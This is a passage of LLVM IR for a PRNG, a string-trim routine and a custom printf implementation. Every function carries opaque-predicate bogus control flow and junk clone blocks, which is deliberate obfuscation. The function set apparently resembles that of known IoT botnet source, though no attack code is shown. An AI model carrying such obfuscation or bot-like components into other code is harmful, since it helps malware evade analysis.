  %24 = xor i32 %18, %23
  %25 = xor i32 %24, -1640531527
  %26 = load i32, i32* %3, align 4
  %27 = xor i32 %25, %26
  %28 = load i32, i32* %3, align 4
  %29 = sext i32 %28 to i64
  %30 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %29
  store i32 %27, i32* %30, align 4
  br label %31

; <label>:31:                                     ; preds = %13
  %32 = load i32, i32* %3, align 4
  %33 = add nsw i32 %32, 1
  store i32 %33, i32* %3, align 4
  br label %10

; <label>:34:                                     ; preds = %10
  %35 = load i32, i32* @x
  %36 = load i32, i32* @y
  %37 = sub i32 %35, 1
  %38 = mul i32 %35, %37
  %39 = urem i32 %38, 2
  %40 = icmp eq i32 %39, 0
  %41 = icmp slt i32 %36, 10
  %42 = or i1 %40, %41
  br i1 %42, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %34
  %43 = load i32, i32* @x
  %44 = load i32, i32* @y
  %45 = sub i32 %43, 1
  %46 = mul i32 %43, %45
  %47 = urem i32 %46, 2
  %48 = icmp eq i32 %47, 0
  %49 = icmp slt i32 %44, 10
  %50 = or i1 %48, %49
  br i1 %50, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %34
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define i32 @rand_cmwc() #0 {
  %1 = load i32, i32* @x.1
  %2 = load i32, i32* @y.2
  %3 = sub i32 %1, 1
  %4 = mul i32 %1, %3
  %5 = urem i32 %4, 2
  %6 = icmp eq i32 %5, 0
  %7 = icmp slt i32 %2, 10
  %8 = or i1 %6, %7
  br i1 %8, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %0
  %9 = alloca i64, align 8
  %10 = alloca i64, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  store i64 18782, i64* %10, align 8
  store i32 -2, i32* %12, align 4
  %13 = load i32, i32* @rand_cmwc.i, align 4
  %14 = add i32 %13, 1
  %15 = and i32 %14, 4095
  store i32 %15, i32* @rand_cmwc.i, align 4
  %16 = load i64, i64* %10, align 8
  %17 = load i32, i32* @rand_cmwc.i, align 4
  %18 = zext i32 %17 to i64
  %19 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %18
  %20 = load i32, i32* %19, align 4
  %21 = zext i32 %20 to i64
  %22 = mul i64 %16, %21
  %23 = load i32, i32* @c, align 4
  %24 = zext i32 %23 to i64
  %25 = add i64 %22, %24
  store i64 %25, i64* %9, align 8
  %26 = load i64, i64* %9, align 8
  %27 = lshr i64 %26, 32
  %28 = trunc i64 %27 to i32
  store i32 %28, i32* @c, align 4
  %29 = load i64, i64* %9, align 8
  %30 = load i32, i32* @c, align 4
  %31 = zext i32 %30 to i64
  %32 = add i64 %29, %31
  %33 = trunc i64 %32 to i32
  store i32 %33, i32* %11, align 4
  %34 = load i32, i32* %11, align 4
  %35 = load i32, i32* @c, align 4
  %36 = icmp ult i32 %34, %35
  %37 = load i32, i32* @x.1
  %38 = load i32, i32* @y.2
  %39 = sub i32 %37, 1
  %40 = mul i32 %37, %39
  %41 = urem i32 %40, 2
  %42 = icmp eq i32 %41, 0
  %43 = icmp slt i32 %38, 10
  %44 = or i1 %42, %43
  br i1 %44, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %36, label %45, label %50

; <label>:45:                                     ; preds = %originalBBpart2
  %46 = load i32, i32* %11, align 4
  %47 = add i32 %46, 1
  store i32 %47, i32* %11, align 4
  %48 = load i32, i32* @c, align 4
  %49 = add i32 %48, 1
  store i32 %49, i32* @c, align 4
  br label %50

; <label>:50:                                     ; preds = %45, %originalBBpart2
  %51 = load i32, i32* %12, align 4
  %52 = load i32, i32* %11, align 4
  %53 = sub i32 %51, %52
  %54 = load i32, i32* @rand_cmwc.i, align 4
  %55 = zext i32 %54 to i64
  %56 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %55
  store i32 %53, i32* %56, align 4
  ret i32 %53

originalBBalteredBB:                              ; preds = %originalBB, %0
  %57 = alloca i64, align 8
  %58 = alloca i64, align 8
  %59 = alloca i32, align 4
  %60 = alloca i32, align 4
  store i64 18782, i64* %58, align 8
  store i32 -2, i32* %60, align 4
  %61 = load i32, i32* @rand_cmwc.i, align 4
  %_ = shl i32 %61, 1
  %_1 = sub i32 0, %61
  %gen = add i32 %_1, 1
  %_2 = shl i32 %61, 1
  %62 = add i32 %61, 1
  %_3 = sub i32 0, %62
  %gen4 = add i32 %_3, 4095
  %_5 = sub i32 %62, 4095
  %gen6 = mul i32 %_5, 4095
  %_7 = sub i32 %62, 4095
  %gen8 = mul i32 %_7, 4095
  %_9 = sub i32 0, %62
  %gen10 = add i32 %_9, 4095
  %_11 = sub i32 0, %62
  %gen12 = add i32 %_11, 4095
  %_13 = sub i32 %62, 4095
  %gen14 = mul i32 %_13, 4095
  %_15 = sub i32 0, %62
  %gen16 = add i32 %_15, 4095
  %63 = and i32 %62, 4095
  store i32 %63, i32* @rand_cmwc.i, align 4
  %64 = load i64, i64* %58, align 8
  %65 = load i32, i32* @rand_cmwc.i, align 4
  %66 = zext i32 %65 to i64
  %67 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %66
  %68 = load i32, i32* %67, align 4
  %69 = zext i32 %68 to i64
  %_17 = shl i64 %64, %69
  %_18 = shl i64 %64, %69
  %70 = mul i64 %64, %69
  %71 = load i32, i32* @c, align 4
  %72 = zext i32 %71 to i64
  %_19 = sub i64 %70, %72
  %gen20 = mul i64 %_19, %72
  %_21 = sub i64 0, %70
  %gen22 = add i64 %_21, %72
  %_23 = sub i64 %70, %72
  %gen24 = mul i64 %_23, %72
  %73 = add i64 %70, %72
  store i64 %73, i64* %57, align 8
  %74 = load i64, i64* %57, align 8
  %_25 = shl i64 %74, 32
  %_26 = shl i64 %74, 32
  %_27 = sub i64 0, %74
  %gen28 = add i64 %_27, 32
  %_29 = shl i64 %74, 32
  %_30 = sub i64 %74, 32
  %gen31 = mul i64 %_30, 32
  %_32 = sub i64 %74, 32
  %gen33 = mul i64 %_32, 32
  %75 = lshr i64 %74, 32
  %76 = trunc i64 %75 to i32
  store i32 %76, i32* @c, align 4
  %77 = load i64, i64* %57, align 8
  %78 = load i32, i32* @c, align 4
  %79 = zext i32 %78 to i64
  %_34 = sub i64 %77, %79
  %gen35 = mul i64 %_34, %79
  %_36 = sub i64 %77, %79
  %gen37 = mul i64 %_36, %79
  %80 = add i64 %77, %79
  %81 = trunc i64 %80 to i32
  store i32 %81, i32* %59, align 4
  %82 = load i32, i32* %59, align 4
  %83 = load i32, i32* @c, align 4
  %84 = icmp ult i32 %82, %83
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define void @trim(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %4, align 4
  %6 = load i8*, i8** %2, align 8
  %7 = call i64 @strlen(i8* %6) #10
  %8 = sub i64 %7, 1
  %9 = trunc i64 %8 to i32
  store i32 %9, i32* %5, align 4
  br label %10

; <label>:10:                                     ; preds = %35, %1
  %11 = load i32, i32* @x.3
  %12 = load i32, i32* @y.4
  %13 = sub i32 %11, 1
  %14 = mul i32 %11, %13
  %15 = urem i32 %14, 2
  %16 = icmp eq i32 %15, 0
  %17 = icmp slt i32 %12, 10
  %18 = or i1 %16, %17
  br i1 %18, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %10
  %19 = load i8*, i8** %2, align 8
  %20 = load i32, i32* %4, align 4
  %21 = sext i32 %20 to i64
  %22 = getelementptr inbounds i8, i8* %19, i64 %21
  %23 = load i8, i8* %22, align 1
  %24 = sext i8 %23 to i32
  %25 = call i32 @isspace(i32 %24) #10
  %26 = icmp ne i32 %25, 0
  %27 = load i32, i32* @x.3
  %28 = load i32, i32* @y.4
  %29 = sub i32 %27, 1
  %30 = mul i32 %27, %29
  %31 = urem i32 %30, 2
  %32 = icmp eq i32 %31, 0
  %33 = icmp slt i32 %28, 10
  %34 = or i1 %32, %33
  br i1 %34, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %26, label %35, label %38

; <label>:35:                                     ; preds = %originalBBpart2
  %36 = load i32, i32* %4, align 4
  %37 = add nsw i32 %36, 1
  store i32 %37, i32* %4, align 4
  br label %10

; <label>:38:                                     ; preds = %originalBBpart2
  br label %39

; <label>:39:                                     ; preds = %70, %38
  %40 = load i32, i32* %5, align 4
  %41 = load i32, i32* %4, align 4
  %42 = icmp sge i32 %40, %41
  br i1 %42, label %43, label %52

; <label>:43:                                     ; preds = %39
  %44 = load i8*, i8** %2, align 8
  %45 = load i32, i32* %5, align 4
  %46 = sext i32 %45 to i64
  %47 = getelementptr inbounds i8, i8* %44, i64 %46
  %48 = load i8, i8* %47, align 1
  %49 = sext i8 %48 to i32
  %50 = call i32 @isspace(i32 %49) #10
  %51 = icmp ne i32 %50, 0
  br label %52

; <label>:52:                                     ; preds = %43, %39
  %53 = phi i1 [ false, %39 ], [ %51, %43 ]
  %54 = load i32, i32* @x.3
  %55 = load i32, i32* @y.4
  %56 = sub i32 %54, 1
  %57 = mul i32 %54, %56
  %58 = urem i32 %57, 2
  %59 = icmp eq i32 %58, 0
  %60 = icmp slt i32 %55, 10
  %61 = or i1 %59, %60
  br i1 %61, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %52
  %62 = load i32, i32* @x.3
  %63 = load i32, i32* @y.4
  %64 = sub i32 %62, 1
  %65 = mul i32 %62, %64
  %66 = urem i32 %65, 2
  %67 = icmp eq i32 %66, 0
  %68 = icmp slt i32 %63, 10
  %69 = or i1 %67, %68
  br i1 %69, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %53, label %70, label %73

; <label>:70:                                     ; preds = %originalBBpart24
  %71 = load i32, i32* %5, align 4
  %72 = add nsw i32 %71, -1
  store i32 %72, i32* %5, align 4
  br label %39

; <label>:73:                                     ; preds = %originalBBpart24
  %74 = load i32, i32* @x.3
  %75 = load i32, i32* @y.4
  %76 = sub i32 %74, 1
  %77 = mul i32 %74, %76
  %78 = urem i32 %77, 2
  %79 = icmp eq i32 %78, 0
  %80 = icmp slt i32 %75, 10
  %81 = or i1 %79, %80
  br i1 %81, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %73
  %82 = load i32, i32* %4, align 4
  store i32 %82, i32* %3, align 4
  %83 = load i32, i32* @x.3
  %84 = load i32, i32* @y.4
  %85 = sub i32 %83, 1
  %86 = mul i32 %83, %85
  %87 = urem i32 %86, 2
  %88 = icmp eq i32 %87, 0
  %89 = icmp slt i32 %84, 10
  %90 = or i1 %88, %89
  br i1 %90, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %91

; <label>:91:                                     ; preds = %123, %originalBBpart28
  %92 = load i32, i32* @x.3
  %93 = load i32, i32* @y.4
  %94 = sub i32 %92, 1
  %95 = mul i32 %92, %94
  %96 = urem i32 %95, 2
  %97 = icmp eq i32 %96, 0
  %98 = icmp slt i32 %93, 10
  %99 = or i1 %97, %98
  br i1 %99, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %91
  %100 = load i32, i32* %3, align 4
  %101 = load i32, i32* %5, align 4
  %102 = icmp sle i32 %100, %101
  %103 = load i32, i32* @x.3
  %104 = load i32, i32* @y.4
  %105 = sub i32 %103, 1
  %106 = mul i32 %103, %105
  %107 = urem i32 %106, 2
  %108 = icmp eq i32 %107, 0
  %109 = icmp slt i32 %104, 10
  %110 = or i1 %108, %109
  br i1 %110, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %102, label %111, label %126

; <label>:111:                                    ; preds = %originalBBpart212
  %112 = load i8*, i8** %2, align 8
  %113 = load i32, i32* %3, align 4
  %114 = sext i32 %113 to i64
  %115 = getelementptr inbounds i8, i8* %112, i64 %114
  %116 = load i8, i8* %115, align 1
  %117 = load i8*, i8** %2, align 8
  %118 = load i32, i32* %3, align 4
  %119 = load i32, i32* %4, align 4
  %120 = sub nsw i32 %118, %119
  %121 = sext i32 %120 to i64
  %122 = getelementptr inbounds i8, i8* %117, i64 %121
  store i8 %116, i8* %122, align 1
  br label %123

; <label>:123:                                    ; preds = %111
  %124 = load i32, i32* %3, align 4
  %125 = add nsw i32 %124, 1
  store i32 %125, i32* %3, align 4
  br label %91

; <label>:126:                                    ; preds = %originalBBpart212
  %127 = load i8*, i8** %2, align 8
  %128 = load i32, i32* %3, align 4
  %129 = load i32, i32* %4, align 4
  %130 = sub nsw i32 %128, %129
  %131 = sext i32 %130 to i64
  %132 = getelementptr inbounds i8, i8* %127, i64 %131
  store i8 0, i8* %132, align 1
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %10
  %133 = load i8*, i8** %2, align 8
  %134 = load i32, i32* %4, align 4
  %135 = sext i32 %134 to i64
  %136 = getelementptr inbounds i8, i8* %133, i64 %135
  %137 = load i8, i8* %136, align 1
  %138 = sext i8 %137 to i32
  %139 = call i32 @isspace(i32 %138) #10
  %140 = icmp ne i32 %139, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %52
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %73
  %141 = load i32, i32* %4, align 4
  store i32 %141, i32* %3, align 4
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %91
  %142 = load i32, i32* %3, align 4
  %143 = load i32, i32* %5, align 4
  %144 = icmp sle i32 %142, %143
  br label %originalBB10
}

; Function Attrs: nounwind readonly
declare i64 @strlen(i8*) #1

; Function Attrs: nounwind readonly
declare i32 @isspace(i32) #1

; Function Attrs: noinline nounwind uwtable
define i32 @zprintf(i8*, ...) #0 {
  %2 = load i32, i32* @x.5
  %3 = load i32, i32* @y.6
  %4 = sub i32 %2, 1
  %5 = mul i32 %2, %4
  %6 = urem i32 %5, 2
  %7 = icmp eq i32 %6, 0
  %8 = icmp slt i32 %3, 10
  %9 = or i1 %7, %8
  br i1 %9, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %1
  %10 = alloca i8*, align 8
  %11 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %10, align 8
  %12 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %11, i32 0, i32 0
  %13 = bitcast %struct.__va_list_tag* %12 to i8*
  call void @llvm.va_start(i8* %13)
  %14 = load i8*, i8** %10, align 8
  %15 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %11, i32 0, i32 0
  %16 = call i32 @print(i8** null, i8* %14, %struct.__va_list_tag* %15)
  %17 = load i32, i32* @x.5
  %18 = load i32, i32* @y.6
  %19 = sub i32 %17, 1
  %20 = mul i32 %17, %19
  %21 = urem i32 %20, 2
  %22 = icmp eq i32 %21, 0
  %23 = icmp slt i32 %18, 10
  %24 = or i1 %22, %23
  br i1 %24, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret i32 %16

originalBBalteredBB:                              ; preds = %originalBB, %1
  %25 = alloca i8*, align 8
  %26 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %25, align 8
  %27 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %26, i32 0, i32 0
  %28 = bitcast %struct.__va_list_tag* %27 to i8*
  call void @llvm.va_start(i8* %28)
  %29 = load i8*, i8** %25, align 8
  %30 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %26, i32 0, i32 0
  %31 = call i32 @print(i8** null, i8* %29, %struct.__va_list_tag* %30)
  br label %originalBB
}

; Function Attrs: nounwind
declare void @llvm.va_start(i8*) #2

; Function Attrs: noinline nounwind uwtable
define internal i32 @print(i8**, i8*, %struct.__va_list_tag*) #0 {
  %4 = load i32, i32* @x.7
  %5 = load i32, i32* @y.8
  %6 = sub i32 %4, 1
  %7 = mul i32 %4, %6
  %8 = urem i32 %7, 2
  %9 = icmp eq i32 %8, 0
  %10 = icmp slt i32 %5, 10
  %11 = or i1 %9, %10
  br i1 %11, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %3
  %12 = alloca i8**, align 8
  %13 = alloca i8*, align 8
  %14 = alloca %struct.__va_list_tag*, align 8
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca [2 x i8], align 1
  %19 = alloca i8*, align 8
  store i8** %0, i8*** %12, align 8
  store i8* %1, i8** %13, align 8
  store %struct.__va_list_tag* %2, %struct.__va_list_tag** %14, align 8
  store i32 0, i32* %17, align 4
  %20 = load i32, i32* @x.7
  %21 = load i32, i32* @y.8
  %22 = sub i32 %20, 1
  %23 = mul i32 %20, %22
  %24 = urem i32 %23, 2
  %25 = icmp eq i32 %24, 0
  %26 = icmp slt i32 %21, 10
  %27 = or i1 %25, %26
  br i1 %27, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %28

; <label>:28:                                     ; preds = %originalBBpart287, %originalBBpart2
  %29 = load i32, i32* @x.7
  %30 = load i32, i32* @y.8
  %31 = sub i32 %29, 1
  %32 = mul i32 %29, %31
  %33 = urem i32 %32, 2
  %34 = icmp eq i32 %33, 0
  %35 = icmp slt i32 %30, 10
  %36 = or i1 %34, %35
  br i1 %36, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %28
  %37 = load i8*, i8** %13, align 8
  %38 = load i8, i8* %37, align 1
  %39 = zext i8 %38 to i32
  %40 = icmp ne i32 %39, 0
  %41 = load i32, i32* @x.7
  %42 = load i32, i32* @y.8
  %43 = sub i32 %41, 1
  %44 = mul i32 %41, %43
  %45 = urem i32 %44, 2
  %46 = icmp eq i32 %45, 0
  %47 = icmp slt i32 %42, 10
  %48 = or i1 %46, %47
  br i1 %48, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %40, label %49, label %510

; <label>:49:                                     ; preds = %originalBBpart24
  %50 = load i8*, i8** %13, align 8
  %51 = load i8, i8* %50, align 1
  %52 = zext i8 %51 to i32
  %53 = icmp eq i32 %52, 37
  br i1 %53, label %54, label %466

; <label>:54:                                     ; preds = %49
  %55 = load i8*, i8** %13, align 8
  %56 = getelementptr inbounds i8, i8* %55, i32 1
  store i8* %56, i8** %13, align 8
  store i32 0, i32* %16, align 4
  store i32 0, i32* %15, align 4
  %57 = load i8*, i8** %13, align 8
  %58 = load i8, i8* %57, align 1
  %59 = zext i8 %58 to i32
  %60 = icmp eq i32 %59, 0
  br i1 %60, label %61, label %62

; <label>:61:                                     ; preds = %54
  br label %510

; <label>:62:                                     ; preds = %54
  %63 = load i8*, i8** %13, align 8
  %64 = load i8, i8* %63, align 1
  %65 = zext i8 %64 to i32
  %66 = icmp eq i32 %65, 37
  br i1 %66, label %67, label %68

; <label>:67:                                     ; preds = %62
  br label %467

; <label>:68:                                     ; preds = %62
  %69 = load i32, i32* @x.7
  %70 = load i32, i32* @y.8
  %71 = sub i32 %69, 1
  %72 = mul i32 %69, %71
  %73 = urem i32 %72, 2
  %74 = icmp eq i32 %73, 0
  %75 = icmp slt i32 %70, 10
  %76 = or i1 %74, %75
  br i1 %76, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %68
  %77 = load i8*, i8** %13, align 8
  %78 = load i8, i8* %77, align 1
  %79 = zext i8 %78 to i32
  %80 = icmp eq i32 %79, 45
  %81 = load i32, i32* @x.7
  %82 = load i32, i32* @y.8
  %83 = sub i32 %81, 1
  %84 = mul i32 %81, %83
  %85 = urem i32 %84, 2
  %86 = icmp eq i32 %85, 0
  %87 = icmp slt i32 %82, 10
  %88 = or i1 %86, %87
  br i1 %88, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %80, label %89, label %108

; <label>:89:                                     ; preds = %originalBBpart28
  %90 = load i32, i32* @x.7
  %91 = load i32, i32* @y.8
  %92 = sub i32 %90, 1
  %93 = mul i32 %90, %92
  %94 = urem i32 %93, 2
  %95 = icmp eq i32 %94, 0
  %96 = icmp slt i32 %91, 10
  %97 = or i1 %95, %96
  br i1 %97, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %89
  %98 = load i8*, i8** %13, align 8
  %99 = getelementptr inbounds i8, i8* %98, i32 1
  store i8* %99, i8** %13, align 8
  store i32 1, i32* %16, align 4
  %100 = load i32, i32* @x.7
  %101 = load i32, i32* @y.8
  %102 = sub i32 %100, 1
  %103 = mul i32 %100, %102
  %104 = urem i32 %103, 2
  %105 = icmp eq i32 %104, 0
  %106 = icmp slt i32 %101, 10
  %107 = or i1 %105, %106
  br i1 %107, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %108

; <label>:108:                                    ; preds = %originalBBpart212, %originalBBpart28
  br label %109

; <label>:109:                                    ; preds = %114, %108
  %110 = load i8*, i8** %13, align 8
  %111 = load i8, i8* %110, align 1
  %112 = zext i8 %111 to i32
  %113 = icmp eq i32 %112, 48
  br i1 %113, label %114, label %119

; <label>:114:                                    ; preds = %109
  %115 = load i8*, i8** %13, align 8
  %116 = getelementptr inbounds i8, i8* %115, i32 1
  store i8* %116, i8** %13, align 8
  %117 = load i32, i32* %16, align 4
  %118 = or i32 %117, 2
  store i32 %118, i32* %16, align 4
  br label %109

; <label>:119:                                    ; preds = %109
  br label %120

; <label>:120:                                    ; preds = %173, %119
  %121 = load i8*, i8** %13, align 8
  %122 = load i8, i8* %121, align 1
  %123 = zext i8 %122 to i32
  %124 = icmp sge i32 %123, 48
  br i1 %124, label %125, label %146

; <label>:125:                                    ; preds = %120
  %126 = load i32, i32* @x.7
  %127 = load i32, i32* @y.8
  %128 = sub i32 %126, 1
  %129 = mul i32 %126, %128
  %130 = urem i32 %129, 2
  %131 = icmp eq i32 %130, 0
  %132 = icmp slt i32 %127, 10
  %133 = or i1 %131, %132
  br i1 %133, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %125
  %134 = load i8*, i8** %13, align 8
  %135 = load i8, i8* %134, align 1
  %136 = zext i8 %135 to i32
  %137 = icmp sle i32 %136, 57
  %138 = load i32, i32* @x.7
  %139 = load i32, i32* @y.8
  %140 = sub i32 %138, 1
  %141 = mul i32 %138, %140
  %142 = urem i32 %141, 2
  %143 = icmp eq i32 %142, 0
  %144 = icmp slt i32 %139, 10
  %145 = or i1 %143, %144
  br i1 %145, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %146

; <label>:146:                                    ; preds = %originalBBpart216, %120
  %147 = phi i1 [ false, %120 ], [ %137, %originalBBpart216 ]
  br i1 %147, label %148, label %176

; <label>:148:                                    ; preds = %146
  %149 = load i32, i32* @x.7
  %150 = load i32, i32* @y.8
  %151 = sub i32 %149, 1
  %152 = mul i32 %149, %151
  %153 = urem i32 %152, 2
  %154 = icmp eq i32 %153, 0
  %155 = icmp slt i32 %150, 10
  %156 = or i1 %154, %155
  br i1 %156, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %148
  %157 = load i32, i32* %15, align 4
  %158 = mul nsw i32 %157, 10
  store i32 %158, i32* %15, align 4
  %159 = load i8*, i8** %13, align 8
  %160 = load i8, i8* %159, align 1
  %161 = zext i8 %160 to i32
  %162 = sub nsw i32 %161, 48
  %163 = load i32, i32* %15, align 4
  %164 = add nsw i32 %163, %162
  store i32 %164, i32* %15, align 4
  %165 = load i32, i32* @x.7
  %166 = load i32, i32* @y.8
  %167 = sub i32 %165, 1
  %168 = mul i32 %165, %167
  %169 = urem i32 %168, 2
  %170 = icmp eq i32 %169, 0
  %171 = icmp slt i32 %166, 10
  %172 = or i1 %170, %171
  br i1 %172, label %originalBBpart231, label %originalBB18alteredBB

originalBBpart231:                                ; preds = %originalBB18
  br label %173

; <label>:173:                                    ; preds = %originalBBpart231
  %174 = load i8*, i8** %13, align 8
  %175 = getelementptr inbounds i8, i8* %174, i32 1
  store i8* %175, i8** %13, align 8
  br label %120

; <label>:176:                                    ; preds = %146
  %177 = load i8*, i8** %13, align 8
  %178 = load i8, i8* %177, align 1
  %179 = zext i8 %178 to i32
  %180 = icmp eq i32 %179, 115
  br i1 %180, label %181, label %247

; <label>:181:                                    ; preds = %176
  %182 = load i32, i32* @x.7
  %183 = load i32, i32* @y.8
  %184 = sub i32 %182, 1
  %185 = mul i32 %182, %184
  %186 = urem i32 %185, 2
  %187 = icmp eq i32 %186, 0
  %188 = icmp slt i32 %183, 10
  %189 = or i1 %187, %188
  br i1 %189, label %originalBB33, label %originalBB33alteredBB

originalBB33:                                     ; preds = %originalBB33alteredBB, %181
  %190 = load %struct.__va_list_tag*, %struct.__va_list_tag** %14, align 8
  %191 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %190, i32 0, i32 0
  %192 = load i32, i32* %191, align 8
  %193 = icmp ule i32 %192, 40
  %194 = load i32, i32* @x.7
  %195 = load i32, i32* @y.8
  %196 = sub i32 %194, 1
  %197 = mul i32 %194, %196
  %198 = urem i32 %197, 2
  %199 = icmp eq i32 %198, 0
  %200 = icmp slt i32 %195, 10
  %201 = or i1 %199, %200
  br i1 %201, label %originalBBpart235, label %originalBB33alteredBB

originalBBpart235:                                ; preds = %originalBB33
  br i1 %193, label %202, label %208

; <label>:202:                                    ; preds = %originalBBpart235
  %203 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %190, i32 0, i32 3
  %204 = load i8*, i8** %203, align 8
  %205 = getelementptr i8, i8* %204, i32 %192
  %206 = bitcast i8* %205 to i32*
  %207 = add i32 %192, 8
  store i32 %207, i32* %191, align 8
  br label %213

; <label>:208:                                    ; preds = %originalBBpart235
  %209 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %190, i32 0, i32 2
  %210 = load i8*, i8** %209, align 8
  %211 = bitcast i8* %210 to i32*
  %212 = getelementptr i8, i8* %210, i32 8
  store i8* %212, i8** %209, align 8
  br label %213

; <label>:213:                                    ; preds = %208, %202
  %214 = phi i32* [ %206, %202 ], [ %211, %208 ]
  %215 = load i32, i32* %214, align 4
  %216 = sext i32 %215 to i64
  %217 = inttoptr i64 %216 to i8*
  store i8* %217, i8** %19, align 8
  %218 = load i8**, i8*** %12, align 8
  %219 = load i8*, i8** %19, align 8
  %220 = icmp ne i8* %219, null
  br i1 %220, label %221, label %223

; <label>:221:                                    ; preds = %213
  %222 = load i8*, i8** %19, align 8
  br label %240

; <label>:223:                                    ; preds = %213
  %224 = load i32, i32* @x.7
  %225 = load i32, i32* @y.8
  %226 = sub i32 %224, 1
  %227 = mul i32 %224, %226
  %228 = urem i32 %227, 2
  %229 = icmp eq i32 %228, 0
  %230 = icmp slt i32 %225, 10
  %231 = or i1 %229, %230
  br i1 %231, label %originalBB37, label %originalBB37alteredBB

originalBB37:                                     ; preds = %originalBB37alteredBB, %223
  %232 = load i32, i32* @x.7
  %233 = load i32, i32* @y.8
  %234 = sub i32 %232, 1
  %235 = mul i32 %232, %234
  %236 = urem i32 %235, 2
  %237 = icmp eq i32 %236, 0
  %238 = icmp slt i32 %233, 10
  %239 = or i1 %237, %238
  br i1 %239, label %originalBBpart239, label %originalBB37alteredBB

originalBBpart239:                                ; preds = %originalBB37
  br label %240

; <label>:240:                                    ; preds = %originalBBpart239, %221
  %241 = phi i8* [ %222, %221 ], [ getelementptr inbounds ([7 x i8], [7 x i8]* @.str.132, i32 0, i32 0), %originalBBpart239 ]
  %242 = load i32, i32* %15, align 4
  %243 = load i32, i32* %16, align 4
  %244 = call i32 @prints(i8** %218, i8* %241, i32 %242, i32 %243)
  %245 = load i32, i32* %17, align 4
  %246 = add nsw i32 %245, %244
  store i32 %246, i32* %17, align 4
  br label %491

; <label>:247:                                    ; preds = %176
  %248 = load i8*, i8** %13, align 8
  %249 = load i8, i8* %248, align 1
  %250 = zext i8 %249 to i32
  %251 = icmp eq i32 %250, 100
  br i1 %251, label %252, label %293

; <label>:252:                                    ; preds = %247
  %253 = load i32, i32* @x.7
  %254 = load i32, i32* @y.8
  %255 = sub i32 %253, 1
  %256 = mul i32 %253, %255
  %257 = urem i32 %256, 2
  %258 = icmp eq i32 %257, 0
  %259 = icmp slt i32 %254, 10
  %260 = or i1 %258, %259
  br i1 %260, label %originalBB41, label %originalBB41alteredBB

originalBB41:                                     ; preds = %originalBB41alteredBB, %252
  %261 = load i8**, i8*** %12, align 8
  %262 = load %struct.__va_list_tag*, %struct.__va_list_tag** %14, align 8
  %263 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %262, i32 0, i32 0
  %264 = load i32, i32* %263, align 8
  %265 = icmp ule i32 %264, 40
  %266 = load i32, i32* @x.7
  %267 = load i32, i32* @y.8
  %268 = sub i32 %266, 1
  %269 = mul i32 %266, %268
  %270 = urem i32 %269, 2
  %271 = icmp eq i32 %270, 0
  %272 = icmp slt i32 %267, 10
  %273 = or i1 %271, %272
